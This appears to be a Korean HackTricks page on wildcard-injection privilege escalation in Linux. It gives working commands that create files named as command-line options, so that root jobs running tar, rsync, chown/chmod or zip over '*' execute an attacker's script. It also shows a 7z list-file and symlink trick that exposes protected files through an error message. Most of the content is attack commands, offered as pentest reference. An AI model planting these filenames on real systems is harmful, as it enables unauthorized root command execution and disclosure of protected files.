<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


## chown, chmod

**나머지 파일에 복사할 파일 소유자와 권한을 지정**할 수 있습니다.
```bash
touch "--reference=/my/own/path/filename"
```
이를 이용하여 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(결합된 공격)_을 사용하여 이를 악용할 수 있습니다.\
자세한 정보는 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인할 수 있습니다.

## Tar

**임의의 명령 실행:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
다음을 사용하여 이를 악용할 수 있습니다. [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar 공격)_\
자세한 정보는 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인할 수 있습니다.

## Rsync

**임의의 명령 실행:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
이를 이용하여 [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(rsync 공격)_을 사용할 수 있습니다.\
자세한 내용은 [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)에서 확인할 수 있습니다.

## 7z

**7z**에서는 `*` 앞에 `--`를 사용하여 임의의 오류를 발생시켜 파일을 읽을 수 있습니다. 따라서 다음과 같은 명령이 root에 의해 실행되고 있다면:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
그리고 이를 실행하는 폴더에 파일을 생성할 수 있습니다. `@root.txt` 파일과 `root.txt` 파일을 생성할 수 있으며, `root.txt` 파일은 읽고자 하는 파일로의 **심볼릭 링크**입니다.
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
그런 다음 **7z**가 실행될 때, `root.txt`를 압축해야 할 파일 목록을 포함하는 파일로 처리할 것입니다 (`@root.txt`의 존재가 그것을 나타냅니다). 그리고 7z가 `root.txt`를 읽을 때, `/file/you/want/to/read`를 읽을 것이며, **이 파일의 내용이 파일 목록이 아니기 때문에 오류가 발생**하여 내용을 표시합니다.

_더 많은 정보는 HackTheBox의 CTF 박스의 Write-ups에서 확인할 수 있습니다._

## Zip

**임의의 명령 실행:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
